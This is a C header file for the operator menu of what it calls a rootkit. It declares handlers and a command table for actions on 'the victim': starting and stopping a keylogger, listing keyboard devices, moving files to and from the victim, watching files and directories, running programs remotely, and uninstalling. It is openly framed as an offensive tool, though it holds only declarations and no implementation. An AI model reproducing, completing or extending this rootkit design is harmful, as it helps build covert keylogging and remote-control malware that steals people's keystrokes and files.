#ifndef ROOTKIT_MENU_H
#define ROOTKIT_MENU_H

#include <stddef.h>
#include "utils.h"

typedef void (*menu_command_handler)(struct server_options * server_options);

typedef struct {
    const char *key;
    const char *description;
    menu_command_handler handler;
} menu_command_t;


// Command handlers
void cmd_disconnect(struct server_options * server_options);
void cmd_uninstall(struct server_options * server_options);
void cmd_start_keylogger(struct server_options * server_options);
void cmd_get_keyboards(struct server_options * server_options);
void cmd_stop_keylogger(struct server_options * server_options);
void cmd_transfer_file(struct server_options * server_options);
void cmd_receive_file(struct server_options * server_options);
void cmd_watch_file(struct server_options * server_options);
void cmd_watch_directory(struct server_options * server_options);
void cmd_run_program(struct server_options * server_options);
void cmd_show_help();

void process_command(struct server_options * server_options, const char *input);

// Menu
static const menu_command_t g_menu_commands[] = {
    { "q", "Disconnect from the victim",            cmd_disconnect},
    { "u", "Uninstall from the victim",             cmd_uninstall },
    { "k", "Start the keylogger on the victim",     cmd_start_keylogger },
    { "g", "Display the Keyboard devices on victim",cmd_get_keyboards },
    { "s", "Stop the keylogger on the victim",      cmd_stop_keylogger },
    { "t", "Transfer a file to the victim",         cmd_transfer_file },
    { "r", "Transfer a file from the victim",       cmd_receive_file },
    { "f", "Watch a file on the victim",            cmd_watch_file },
    { "d", "Watch a directory on the victim",       cmd_watch_directory },
    { "p", "Run a program on the victim",           cmd_run_program },
    { "h", "Show help",                             cmd_show_help },
    { NULL, NULL, NULL }
};


#endif //ROOTKIT_MENU_H